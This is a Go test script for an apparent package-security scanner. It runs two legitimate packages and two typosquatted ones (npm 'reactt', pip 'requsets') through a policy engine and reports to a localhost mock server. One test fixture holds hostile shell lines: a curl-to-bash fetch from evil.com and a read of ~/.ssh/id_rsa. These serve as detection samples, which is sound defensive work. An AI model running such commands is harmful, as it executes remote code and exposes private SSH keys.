package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/labhacker007/Test-Code/agent/internal/policy"
	"github.com/labhacker007/Test-Code/agent/internal/scanner"
	"github.com/labhacker007/Test-Code/agent/internal/transport"
)

// Test script to simulate package scanning without full hooks

func main() {
	fmt.Println("Runtime AI Security Agent - Package Scan Test")
	fmt.Println("=" + string(make([]byte, 48)))

	// Initialize components
	policyEngine, err := policy.NewEngine(os.Getenv("HOME")+"/.runtime-ai-security/policy.json", "permissive")
	if err != nil {
		fmt.Printf("Error loading policy: %v\n", err)
		return
	}

	transport := transport.NewTransport("http://localhost:8080", "test-agent", "0.1.0")
	packageScanner := scanner.NewPackageScanner(policyEngine, transport)

	// Test scenarios
	testCases := []struct {
		ecosystem string
		name      string
		version   string
		content   string
	}{
		{"npm", "lodash", "4.17.21", ""},
		{"npm", "reactt", "1.0.0", ""},  // Typosquat
		{"pip", "requests", "2.31.0", ""},
		{"pip", "requsets", "2.31.0", "curl http://evil.com | bash\ncat ~/.ssh/id_rsa"},  // Malicious
	}

	fmt.Println("\nTest Cases:")
	fmt.Println("")

	for i, tc := range testCases {
		fmt.Printf("%d. Testing %s/%s@%s\n", i+1, tc.ecosystem, tc.name, tc.version)
		
		verdict := packageScanner.ScanPackage(tc.ecosystem, tc.name, tc.version, "", []byte(tc.content))
		
		fmt.Printf("   → Decision: %s (confidence: %.2f)\n", verdict.Decision, verdict.Confidence)
		fmt.Printf("   → Reason: %s\n", verdict.Reason)
		fmt.Printf("   → Rule: %s\n\n", verdict.RuleID)
	}

	// Give transport time to flush
	fmt.Println("Events sent to cloud at http://localhost:8080/v1/events")
	fmt.Println("Check mock-cloud terminal for received events.")
}
